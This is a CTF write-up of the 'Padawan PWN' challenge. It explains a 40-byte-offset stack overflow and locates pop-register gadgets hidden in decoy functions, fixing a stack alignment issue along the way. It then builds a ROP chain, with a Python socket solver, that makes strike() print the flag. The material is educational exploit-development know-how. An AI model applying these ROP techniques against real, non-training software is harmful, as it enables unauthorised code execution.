<!-- writeup by Abdelkader -->
<!-- standalone repo: https://github.com/Abdelkad3r/hasblctf-2026/tree/main/pwn/padawan-pwn -->
<!-- (full solve.py and handout/ live there) -->

# Padawan PWN (pwn)

| Field    | Value                                                          |
| -------- | -------------------------------------------------------------- |
| Category | pwn                                                            |
| Target   | `nc 34.77.68.154 10005` — Linux x86-64 ELF, not stripped (NX, no PIE) |
| Flag     | `HASBL{M4Y_7H3_F0RC3_B3_W17H_Y0U}`                             |

## Description

> *A long time ago in a server far, far away…*
>
> **STAR WARS** — *Episode 0x90* — **THE ORDER OF THE BUFFER OVERFLOW**
>
> The galaxy is under the iron grip of the Dark Side. Darth Vader has
> deployed the ultimate defense: a binary completely shielded by the
> dreaded **nx bit**, rendering traditional shellcode and overflow
> tricks useless.
>
> Desperate to defeat his father and restore a shell to the system,
> young jedi Luke Skywalker journeys to the murky memory dumps of the
> **Dagobah cluster**. There, he seeks the wisdom of Jedi Master Yoda,
> the legendary grandmaster of **ROPFU**.

Stack buffer overflow in `main` plus a friendly `strike(a, b, c)`
function that opens `flag.txt` and prints it — but only if you call
it with the right three magic register values. ROP gadgets are hidden
*inside the dummy story functions* (`attack`, `dodge`, `finish`), so
the whole challenge is "find one `pop reg ; ret` of each colour, then
build the right chain."

## TL;DR

```
$ ./solve.py
… banner …
[The Darth Vader]: Not bad! Now I'll show you the power of the dark side!
End him now!
HASBL{M4Y_7H3_F0RC3_B3_W17H_Y0U}
```

The payload is one 104-byte ROP chain:

```
[ 40 bytes 'A' padding ]
[ 0x4013bf  pop rdi ; ret ]
[ 0xDEADCAFE              ]
[ 0x4013d7  pop rsi ; ret ]
[ 0xCAFEBABE              ]
[ 0x4013de  pop rdx ; ret ]
[ 0xDEADC0DE              ]
[ 0x4013c0  ret (alignment) ]
[ 0x401186  strike         ]
```

Three pops to load the magic constants into the SysV-ABI argument
registers, one alignment-`ret`, then the address of `strike` — which
proceeds to `read(fd, buf, 0x100) ; puts(buf)` against `flag.txt`.

## Recon

### Step 1 — the binary

```
$ file padawan
padawan: ELF 64-bit LSB, x86-64, dynamically linked, GNU/Linux, not stripped

$ nm padawan | grep -E ' [Tt] ' | sort
0000000000401000 T _init
00000000004010a0 T _start
00000000004010d0 T _dl_relocate_static_pie
0000000000401186 T strike
000000000040129c T banner
000000000040133f T main
00000000004013b0 T attack
00000000004013c1 T dodge
00000000004013d9 T finish
00000000004013e0 T _fini
```

Static (non-PIE) layout. NX is on (it's the *premise* of the brief),
but no canary, no stripping, and several invitingly-named functions
that aren't called from anywhere — those are the gadget mines.

### Step 2 — main

```nasm
40133f <main>:
  pushq    %rbp
  movq     %rsp, %rbp
  subq     $0x20, %rsp             ; 32-byte buffer at [rbp - 0x20 .. rbp]
  …zero locals…
  callq    banner                  ; prints the Star Wars intro
  ; puts("The Darth Vader strikes and Luke perfectly dodges it!")
  ; puts("[The Darth Vader]: Not bad at all! Now, show me what you got:")
  leaq     -0x20(%rbp), %rax
  movl     $0x80, %edx              ; <-- 128-byte read
  movq     %rax, %rsi
  movl     $0x0, %edi
  callq    read@plt                 ; <-- 128 bytes into a 32-byte buffer
  movl     $0x0, %eax
  leave
  retq
```

Classic textbook overflow: `read(0, buf, 128)` into a 32-byte buffer.
Stack frame layout:

```
   rbp-0x20  +----------------+ <- buf (32 bytes)
             |  user input    |
   rbp-0x00  +----------------+ <- saved rbp (8 bytes)
   rbp+0x08  +----------------+ <- saved rip (8 bytes; what we hijack)
             |  caller frame  |
             +----------------+
```

So **40 bytes** of padding before the saved RIP slot, then the ROP
chain.

### Step 3 — strike: the flag printer with a price

```nasm
401186 <strike>:                ; strike(rdi, rsi, rdx)
  pushq   %rbp; mov rsp,rbp; sub $0x30,%rsp
  movq    %rdi, -0x18(%rbp)         ; save arguments
  movq    %rsi, -0x20(%rbp)
  movq    %rdx, -0x28(%rbp)
  …open("flag.txt", O_RDONLY)…
  movl    %eax, -0x4(%rbp)          ; -0x4 = fd
  …malloc(0x100)…
  movq    %rax, -0x10(%rbp)         ; -0x10 = buf
  cmpl    $-1, -0x4(%rbp)
  jne     .Lflag_ok
    puts("Couldn't open the flag.txt file, contact to an administrator!")
    exit(-1)
.Lflag_ok:
  movl    $0xDEADCAFE, %eax
  cmpq    %rax, -0x18(%rbp)        ; rdi == 0xDEADCAFE ?
  je      .Lcheck2
    puts("You couldn't attack!")    ; this is the failure message
    exit(1)
.Lcheck2:
  puts("[The Darth Vader]: Not bad! Now I'll show you the power of the dark side!")
  movl    $0xCAFEBABE, %eax
  cmpq    %rax, -0x20(%rbp)        ; rsi == 0xCAFEBABE ?
  je      .Lcheck3
    puts("You couldn't dodge!")
    exit(1)
.Lcheck3:
  puts("End him now!")
  movl    $0xDEADC0DE, %eax
  cmpq    %rax, -0x28(%rbp)        ; rdx == 0xDEADC0DE ?
  je      .Lwin
    puts("[The Darth Vader] You dont have whatever it takes!")
    exit(1)
.Lwin:
  …read(fd, buf, 0x100); puts(buf); close(fd);
  retq
```

Three sequential `cmpq` gates against three hardcoded magic constants
loaded into argument registers by the SysV ABI. Pass them all and
`strike` reads `flag.txt` and `puts`es it for us — no shellcode, no
shell, no execve.

### Step 4 — gadget mining inside the story functions

The four other top-level functions are named after Padawan training
("attack", "dodge", "finish", "strike"), but `attack`, `dodge`, and
`finish` are decoys. Their *bodies* are nonsense or junk; their *tails*
each carry a single useful gadget.

**attack** (`0x4013b0`):

```nasm
4013b0 <attack>:
  movl    $0x1337, %eax
  xorl    %ecx, %ecx
4013b7 <l>:
  cmpl    $0x2f, %ecx
  je      0x4013b0 <attack>
  incq    %rax
  ; ↓ gadget ↓
  popq    %rdi
  retq
```

Bytes at `0x4013bf-0x4013c0`: `5f c3` — `pop rdi ; ret`. And the
bare `c3` at `0x4013c0` is *also* usable on its own — a one-byte `ret`
gadget for stack alignment.

**dodge** (`0x4013c1`):

```nasm
4013c1 <dodge>:
  movl    $0x4444, %edi
  movl    $0x123456, %esi
  movl    $0x721321, %edx
  xorq    %rbx, %rbx
  pushq   %rbx
  retq
  ; --- dead code below ---
  xorl    %eax, %eax
  ; ↓ gadget ↓
  popq    %rsi
  retq
```

The `pushq %rbx; retq` at `0x4013d3-0x4013d4` is a no-op trap — it
pushes 0 and rets to address 0, which is what would happen if you
mistakenly jumped to dodge's *entry*. The actual *gadget* is the dead
code at `0x4013d7-0x4013d8`: `5e c3` — `pop rsi ; ret`.

**finish** (`0x4013d9`):

```nasm
4013d9 <finish>:
  .ascii  "bang\0"               ; literally the byte string "bang"
  ; ↓ gadget ↓
  popq    %rdx
  retq
```

The function's "body" is the four ASCII bytes `b a n g \0` (`62 61 6e
67 00`). Right after that, `5a c3` — `pop rdx ; ret` at `0x4013de`.

So we have, in `.text`:

| Gadget                | Address      |
|-----------------------|--------------|
| `pop rdi ; ret`       | `0x4013bf`   |
| `ret` (bare)          | `0x4013c0`   |
| `pop rsi ; ret`       | `0x4013d7`   |
| `pop rdx ; ret`       | `0x4013de`   |
| `strike`              | `0x401186`   |

Everything we need. Note there's no `pop rcx ; ret` and no
`mov rdx, …` — and we don't need them, because `strike` reads its
three arguments straight out of the SysV-ABI registers.

### Step 5 — the alignment problem

First attempt, no alignment fixup:

```
[A * 40][pop_rdi][0xDEADCAFE][pop_rsi][0xCAFEBABE][pop_rdx][0xDEADC0DE][strike]
```

Walk the stack: when `main`'s `leave; ret` fires, `rsp` is 16-byte
aligned (call it `X`). Each `pop X ; ret` advances rsp by 16, so after
three of them rsp is still `X + 48`, still 0-mod-16. Entering `strike`
the rsp is `X + 56` — wait, no: after `pop_rdx ; ret`, rsp = `X + 48`,
then the `ret` pops the next 8 bytes (strike's address) and sets
rsp = `X + 56`.

But x86-64 SysV says: **at a `CALL` site, rsp must be 0-mod-16**, so
when a function begins (right after the CALL pushed the 8-byte return
address), rsp is **8-mod-16**. The standard prologue `push rbp ; mov
rbp, rsp` restores it to 0-mod-16, and from there `movdqa`/`movaps`
inside glibc routines work correctly.

Here we entered `strike` *without* a `CALL`, so rsp at strike-entry is
0-mod-16 instead of the expected 8-mod-16. After `push rbp` rsp is
8-mod-16 — *misaligned* for the next call boundary. `strike` calls
`open@plt`, and somewhere down that path glibc tries a `movdqa` /
`movaps` on a 16-byte boundary; the misalignment fires `SIGSEGV`.

Fix: one extra naked `ret` between the last pop and `strike`. That
extra ret pops 8 bytes, shifting rsp by 8 — so strike enters with rsp
= 8-mod-16, exactly what the ABI promises. We already have a bare
`ret` at `0x4013c0` (the `c3` immediately after `pop rdi`).

Final chain:

```
[ 40 'A' bytes ]
[ 0x4013bf pop rdi ; ret ]
[ 0xDEADCAFE ]
[ 0x4013d7 pop rsi ; ret ]
[ 0xCAFEBABE ]
[ 0x4013de pop rdx ; ret ]
[ 0xDEADC0DE ]
[ 0x4013c0 ret ]            ; <- alignment
[ 0x401186 strike ]
```

104 bytes total.

### Step 6 — send it

```python
import socket, struct
p = lambda v: struct.pack("<Q", v)
chain  = b"A"*40
chain += p(0x4013bf) + p(0xDEADCAFE)
chain += p(0x4013d7) + p(0xCAFEBABE)
chain += p(0x4013de) + p(0xDEADC0DE)
chain += p(0x4013c0)
chain += p(0x401186)
chain += b"\n"

s = socket.create_connection(("34.77.68.154", 10005))
… drain banner …
s.sendall(chain)
print(s.recv(4096).decode())
```

Server replies, in order:

```
[The Darth Vader]: Not bad! Now I'll show you the power of the dark side!
End him now!
HASBL{M4Y_7H3_F0RC3_B3_W17H_Y0U}
```

The three "encouragement" strings are the `puts` calls between strike's
three `cmpq` gates — we hit each gate in turn and they all passed, so
strike fell through to `read(fd, buf, 0x100) ; puts(buf)`.

## Flag

```
HASBL{M4Y_7H3_F0RC3_B3_W17H_Y0U}
```

*"May the force be with you."*

## Defender notes

* **Decoy functions whose *tail* is the actual gadget is a clean
  pattern.** `attack`, `dodge`, `finish` *look* like they are part of
  the story-checking flow, and their entry points do nonsense
  (`mov eax, 0x1337; xor ecx, ecx; loop`). The single `pop X ; ret`
  hidden at each tail is the only thing the author ever wanted you to
  use. A linker can be persuaded to keep dead code by giving the
  function the right symbol name and reachability — no special
  attribute required.
* **NX + no canary + no PIE is the standard "intro ROP" loadout.**
  Take away any one and the chain breaks (no NX → write shellcode; PIE
  → leak first; canary → leak second). Stack-buffer crackmes lean on
  the absence of canaries; production binaries should have them on by
  default (`-fstack-protector-strong`).
* **The 16-byte alignment trap is the secondary puzzle.** Plenty of
  CTF solvers send the obvious chain `[pop pop pop strike]` and get a
  segfault on the first glibc call inside `strike`. The fix is *always*
  the same — a single bare `ret` gadget — and there's almost always
  one in the binary; `objdump -d binary | grep -B0 -A0 ': c3$'` will
  find them. Worth knowing as a reflex.
* **Argument register chaining (`pop rdi`/`pop rsi`/`pop rdx`) is
  enough to call most libc functions.** As long as the binary contains
  a `pop rdi ; ret`, a `pop rsi ; ret` (or `pop rsi ; pop r15 ; ret`,
  even with the second pop landing on garbage), and a `pop rdx ; ret`,
  you can call `open`, `read`, `write`, `mprotect`, `system`, etc.
  Modern stripped binaries with `-fcf-protection` and a lot of `endbr`
  instructions can be harder to find such gadgets in, but the
  challenge author has explicitly seeded them here.
* **The intended "no shellcode, no execve" win is unusual but worth
  noticing.** Most CTF pwn solutions end with a shell. This one ends
  with `read(fd, buf, 0x100) ; puts(buf)` — the *flag-printer is
  inside the binary*, you just have to make the call. Pattern-match:
  any function called `strike`/`win`/`secret`/`backdoor` in a
  not-stripped pwn binary should be your first stop.

## Files

* [`solve.py`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/pwn/padawan-pwn/solve.py) — argparse-driven solver. Builds the
  3-pop-plus-alignment-ret ROP chain, sends it over the socket, prints
  the flag returned by `strike`'s `puts`. Standard library only.
* [`handout/padawan`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/pwn/padawan-pwn/handout/padawan) — the original challenge
  binary.

## Requirements

Python 3.9+; standard library only.
